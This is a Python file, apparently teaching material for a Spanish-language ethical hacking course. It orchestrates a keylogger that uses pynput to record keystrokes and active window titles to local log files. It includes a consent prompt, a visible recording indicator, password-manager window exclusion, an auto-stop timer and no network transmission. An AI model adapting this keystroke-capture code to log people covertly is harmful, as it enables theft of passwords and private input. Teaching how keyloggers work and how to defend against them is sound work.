#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  KEYLOGGER EDUCATIVO  ·  Curso de Hacking Ético  ·  ORQUESTADOR
================================================================================
  PROPÓSITO ACADÉMICO
  -------------------
  Programa desarrollado EXCLUSIVAMENTE con fines educativos: demostrar en clase
  cómo funciona internamente un keylogger y, sobre todo, cómo DEFENDERSE de esta
  amenaza. Es transparente por diseño (lo contrario de un malware):

      * Muestra un aviso de CONSENTIMIENTO y exige confirmación explícita.
      * Enseña un indicador VISIBLE y persistente de que está grabando.
      * Guarda TODO en LOCAL (.txt + .jsonl). No abre sockets ni envía nada.
      * No se oculta, no persiste, no se disfraza. Se detiene con una tecla.

  USO ÉTICO Y LEGAL
  -----------------
  Ejecútalo ÚNICAMENTE en TU PROPIA computadora o en un laboratorio autorizado.
  Registrar las pulsaciones de otra persona sin su consentimiento es ILEGAL (en
  Perú puede constituir delito informático, Ley N.° 30096).

  ARQUITECTURA (responsabilidades separadas)
  ------------------------------------------
      config.py    -> opciones benignas (CLI + config.json)
      ventana.py   -> título de la ventana activa (multiplataforma)
      captura.py   -> formateo de teclas (char / especial / combinación)
      registro.py  -> escritura robusta del .txt y el .jsonl
      keylogger.py -> ESTE archivo: pega todo y gestiona el ciclo de vida

  FLUJO (cómo pynput engancha los eventos):
      teclado físico
          │  (el SO entrega eventos de tecla)
          ▼
      pynput.keyboard.Listener  (hilo aparte)
          │  on_press / on_release
          ▼
      Teclado.presionar()  ──►  EventoTecla (char/especial/combo)
          │
          ▼
      Registrador  ──►  registro_teclas.txt   (legible)
                    └─►  registro_teclas.jsonl (estructurado → panel web)
================================================================================
"""

from __future__ import annotations

import getpass
import logging
import os
import platform
import signal
import sys
import threading
import time
from typing import Any

from pynput import keyboard

import ventana
from captura import Teclado
from config import Config, config_desde_args, escribir_config_ejemplo
from registro import Registrador, marca_de_tiempo

# --------------------------------------------------------------------------- #
# Logging (mensajes de estado; no "prints sueltos")
# --------------------------------------------------------------------------- #
logging.basicConfig(
    level=logging.INFO,
    format="  %(message)s",
    stream=sys.stdout,
)
_log = logging.getLogger("keylogger")


# --------------------------------------------------------------------------- #
# Resolución de nombres de tecla -> objeto de pynput
# --------------------------------------------------------------------------- #
def resolver_tecla(nombre: str) -> Any:
    """Convierte un nombre ('esc', 'f9', 'q') en un objeto de tecla de pynput."""
    nombre = nombre.strip().lower()
    especial = getattr(keyboard.Key, nombre, None)
    if especial is not None:
        return especial
    if len(nombre) == 1:
        return keyboard.KeyCode.from_char(nombre)
    raise ValueError(
        f"Tecla no reconocida: {nombre!r}. Usa nombres como esc, f9, tab o una letra."
    )


# --------------------------------------------------------------------------- #
# Consentimiento (obligatorio antes de iniciar)
# --------------------------------------------------------------------------- #
def mostrar_consentimiento(cfg: Config) -> bool:
    """Muestra el aviso ético y pide confirmación explícita."""
    linea = "=" * 70
    print(linea)
    print("  KEYLOGGER EDUCATIVO · CURSO DE HACKING ÉTICO")
    print(linea)
    print("  AVISO: Esta herramienta registra las pulsaciones del teclado.")
    print("  • Úsala SOLO en tu propio equipo o laboratorio autorizado.")
    print("  • Registrar a terceros sin consentimiento es ILEGAL (Perú: Ley 30096).")
    print("  • Todo se guarda en LOCAL; NO se envía nada por la red.")
    print(f"  • Detén la captura con la tecla [{cfg.tecla_salir.upper()}]"
          f" · pausa/reanuda con [{cfg.tecla_pausa.upper()}].")
    print("  • Los registros pueden contener datos sensibles: no los compartas.")
    print(linea)
    try:
        respuesta = input("  ¿Confirmas un uso ético y autorizado? (si/no): ")
    except (EOFError, KeyboardInterrupt):
        return False
    return respuesta.strip().lower() in ("si", "sí", "s", "yes", "y")


# --------------------------------------------------------------------------- #
# Borrado seguro de los registros locales
# --------------------------------------------------------------------------- #
def borrar_registros_seguro(cfg: Config) -> None:
    """Sobrescribe y elimina los registros locales (minimización de datos).

    Nota honesta: en discos SSD la sobrescritura no garantiza borrado físico por
    el desgaste de celdas; para una demo educativa es suficiente y se explica
    esta limitación en el README.
    """
    for ruta in (cfg.ruta_txt, cfg.ruta_jsonl):
        if not os.path.exists(ruta):
            _log.info("No existe (nada que borrar): %s", ruta)
            continue
        try:
            tam = os.path.getsize(ruta)
            with open(ruta, "r+b") as f:
                f.write(os.urandom(tam))
                f.flush()
                os.fsync(f.fileno())
            os.remove(ruta)
            _log.info("Borrado seguro: %s", ruta)
        except OSError as e:
            _log.error("No se pudo borrar %s: %s", ruta, e)


# --------------------------------------------------------------------------- #
# El keylogger
# --------------------------------------------------------------------------- #
class KeyloggerEducativo:
    """Orquesta la captura: engancha pynput, gestiona pausa, tiempo y ventanas."""

    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self._teclado = Teclado()
        self._reg: Registrador | None = None
        self._listener: keyboard.Listener | None = None

        self._tecla_salir = resolver_tecla(cfg.tecla_salir)
        self._tecla_pausa = resolver_tecla(cfg.tecla_pausa)
        self._excluidas = [e.lower() for e in cfg.ventanas_excluidas]

        self._en_pausa = False
        self._excluida_activa = False
        self._ultima_ventana: str | None = None
        self._motivo = "desconocido"

        self._parar_evt = threading.Event()
        self._duracion_seg = cfg.duracion_maxima_min * 60.0
        self._intervalo_seg = cfg.intervalo_recordatorio_min * 60.0

    # -- Ventana activa + exclusión ---------------------------------------- #
    def _titulo_excluido(self, titulo: str) -> bool:
        t = (titulo or "").lower()
        return any(sub in t for sub in self._excluidas)

    def _procesar_ventana(self) -> tuple[str, bool]:
        """Devuelve (titulo_a_registrar, excluida) y anota cambios de ventana.

        La exclusión se evalúa SIEMPRE contra el título real (para proteger los
        gestores de contraseñas), pero si ``registrar_ventanas`` está desactivado
        el título nunca llega a los registros (se guarda como "N/D").
        """
        titulo_real = ventana.titulo_ventana_activa()
        excluida = self._titulo_excluido(titulo_real)

        # Transición de/hacia una ventana sensible: deja constancia clara.
        if excluida != self._excluida_activa:
            self._excluida_activa = excluida
            if self._reg is not None:
                if excluida:
                    self._reg.registrar_nota(
                        "Captura OMITIDA: ventana sensible activa (minimización de datos)"
                    )
                else:
                    self._reg.registrar_nota("Captura reanudada: ventana sensible cerrada")

        if not self.cfg.registrar_ventanas:
            return "N/D (no registrado)", excluida

        if not excluida and titulo_real != self._ultima_ventana:
            self._ultima_ventana = titulo_real
            if self._reg is not None:
                self._reg.registrar_ventana(titulo_real)
        return titulo_real, excluida

    # -- Callbacks de pynput (envueltos: nunca deben tumbar el listener) --- #
    def _on_press(self, tecla: Any) -> bool | None:
        try:
            if tecla == self._tecla_salir:
                self._motivo = f"tecla {self.cfg.tecla_salir.upper()}"
                self._parar_evt.set()
                return False  # detiene el listener

            if tecla == self._tecla_pausa:
                self._alternar_pausa()
                return None

            if self._en_pausa:
                return None

            titulo, excluida = self._procesar_ventana()
            if excluida:
                return None  # no registrar mientras haya una ventana sensible

            evento = self._teclado.presionar(tecla)
            if evento is not None and self._reg is not None:
                self._reg.registrar_tecla(evento, titulo)
        except Exception:  # noqa: BLE001 — robustez: un fallo puntual no cae
            _log.exception("Error al procesar una pulsación (ignorado).")
        return None

    def _on_release(self, tecla: Any) -> None:
        try:
            self._teclado.soltar(tecla)
        except Exception:  # noqa: BLE001
            _log.exception("Error al soltar una tecla (ignorado).")

    def _alternar_pausa(self) -> None:
        self._en_pausa = not self._en_pausa
        if self._reg is not None:
            self._reg.registrar_pausa(self._en_pausa)
        estado = "PAUSADA ⏸" if self._en_pausa else "REANUDADA ●"
        _log.info("Captura %s (%s)", estado, marca_de_tiempo())

    # -- Hilo de estado: indicador visible + auto-detención ---------------- #
    def _bucle_estado(self) -> None:
        inicio = time.monotonic()
        proximo = inicio + self._intervalo_seg if self._intervalo_seg else None
        while not self._parar_evt.wait(1.0):
            ahora = time.monotonic()
            if self._duracion_seg and (ahora - inicio) >= self._duracion_seg:
                _log.info("Tiempo máximo alcanzado (%.0f min): deteniendo.",
                          self.cfg.duracion_maxima_min)
                self._motivo = "tiempo máximo"
                self._parar_evt.set()
                self._detener_listener()
                return
            if proximo and ahora >= proximo and not self._en_pausa:
                _log.info("● GRABANDO — %s — [%s] detener · [%s] pausar",
                          marca_de_tiempo(), self.cfg.tecla_salir.upper(),
                          self.cfg.tecla_pausa.upper())
                proximo = ahora + self._intervalo_seg

    def _detener_listener(self) -> None:
        if self._listener is not None:
            self._listener.stop()

    # -- Señales (cierre ordenado con SIGTERM/SIGINT) ---------------------- #
    def _instalar_senales(self) -> None:
        def manejador(signum, _frame):
            self._motivo = f"señal {signal.Signals(signum).name}"
            self._parar_evt.set()
            self._detener_listener()

        for sig in (signal.SIGINT, getattr(signal, "SIGTERM", signal.SIGINT)):
            try:
                signal.signal(sig, manejador)
            except (ValueError, OSError):
                pass  # p. ej. si no estamos en el hilo principal

    # -- Ejecución --------------------------------------------------------- #
    def ejecutar(self) -> None:
        meta = {
            "usuario": getpass.getuser(),
            "equipo": platform.node(),
            "sistema": f"{platform.system()} {platform.release()}",
            "consentimiento": "aceptado explícitamente en consola",
        }

        _log.info("")
        _log.info("● GRABANDO — presiona [%s] para detener, [%s] para pausar.",
                  self.cfg.tecla_salir.upper(), self.cfg.tecla_pausa.upper())
        _log.info("  Ventana activa vía: %s", ventana.soporte_disponible())
        if self.cfg.duracion_maxima_min:
            _log.info("  Auto-detención en %.0f min.", self.cfg.duracion_maxima_min)
        _log.info("  Registro (local): %s", self.cfg.ruta_txt)
        _log.info("")

        self._instalar_senales()

        with Registrador(self.cfg.ruta_txt, self.cfg.ruta_jsonl) as reg:
            self._reg = reg
            reg.iniciar_sesion(meta)

            hilo = threading.Thread(target=self._bucle_estado, daemon=True)
            hilo.start()

            self._listener = keyboard.Listener(
                on_press=self._on_press, on_release=self._on_release
            )
            self._listener.start()
            try:
                self._listener.join()
            except KeyboardInterrupt:
                self._motivo = "Ctrl+C"
                self._detener_listener()
            finally:
                self._parar_evt.set()
                hilo.join(timeout=2.0)
                reg.detener_sesion(self._motivo)

        _log.info("")
        _log.info("[*] Captura detenida (%s).", self._motivo)
        _log.info("[*] Registros guardados:")
        _log.info("      %s", self.cfg.ruta_txt)
        _log.info("      %s", self.cfg.ruta_jsonl)
        _log.info("[*] Recuerda: pueden contener datos sensibles. No los compartas.")


# --------------------------------------------------------------------------- #
# Punto de entrada
# --------------------------------------------------------------------------- #
def main(argv: list[str] | None = None) -> int:
    try:
        cfg, args = config_desde_args(argv)
    except (ValueError, SystemExit) as e:
        if isinstance(e, SystemExit):
            return int(e.code or 0)
        _log.error("Configuración inválida: %s", e)
        return 2

    if args.crear_config:
        ruta = escribir_config_ejemplo(args.config)
        _log.info("config.json de ejemplo escrito en: %s", ruta)
        return 0

    if args.borrar_registros:
        borrar_registros_seguro(cfg)
        return 0

    if not mostrar_consentimiento(cfg):
        _log.info("[*] Operación cancelada. No se registró nada.")
        return 0

    try:
        KeyloggerEducativo(cfg).ejecutar()
    except Exception:  # noqa: BLE001
        _log.exception("Error inesperado durante la captura.")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
